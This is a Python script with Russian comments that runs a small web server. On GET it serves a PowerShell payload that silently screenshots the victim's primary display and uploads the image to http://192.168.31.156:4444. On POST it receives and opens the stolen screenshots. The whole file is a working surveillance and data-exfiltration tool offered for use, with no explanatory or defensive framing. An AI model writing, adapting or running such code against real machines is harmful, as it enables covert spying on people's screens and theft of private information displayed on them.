from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi
from PIL import Image
from io import BytesIO

class WebHandler(BaseHTTPRequestHandler):
    def do_GET(self): #Прием ссобщения с типом запроса Get
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write\
(b"""Add-Type -AssemblyName System.Windows.Forms; 
Add-Type -AssemblyName System.Drawing; 
$screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; 
$bitmap = New-Object System.Drawing.Bitmap $screenBounds.Width, $screenBounds.Height; 
$graphics = [System.Drawing.Graphics]::FromImage($bitmap); 
$graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size); 
$tempPath = [System.IO.Path]::GetTempFileName() + ".png"; 
$bitmap.Save($tempPath, [System.Drawing.Imaging.ImageFormat]::Png); 
$bitmap.Dispose(); 
$graphics.Dispose(); 
$uploadUrl = "http://192.168.31.156:4444"; 
Invoke-RestMethod -Uri $uploadUrl -Method Post -InFile $tempPath -ContentType "multipart/form-data";
""")

    def do_POST(self): #Прием сообщения с типом запроса POST
        try:
            content_type, _ = cgi.parse_header(self.headers['Content-Type'])
            if content_type == 'multipart/form-data':
                content_length = int(self.headers['Content-Length'])
                image_bytes = self.rfile.read(content_length)

                # Отображаем изображение
                img = Image.open(BytesIO(image_bytes))
                img.show()

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'Image displayed successfully')
            else:
                self.send_response(400)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Unsupported content type")
        except Exception as e:
            self.send_response(500)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"Error: {e}".encode())

if __name__ == '__main__':
    port = 4444
    server_address = ('192.168.31.156', port)

    with HTTPServer(server_address, WebHandler) as httpd: #Запуск Веб-сервера
        print(f"Serving on port {port}")
        httpd.serve_forever()
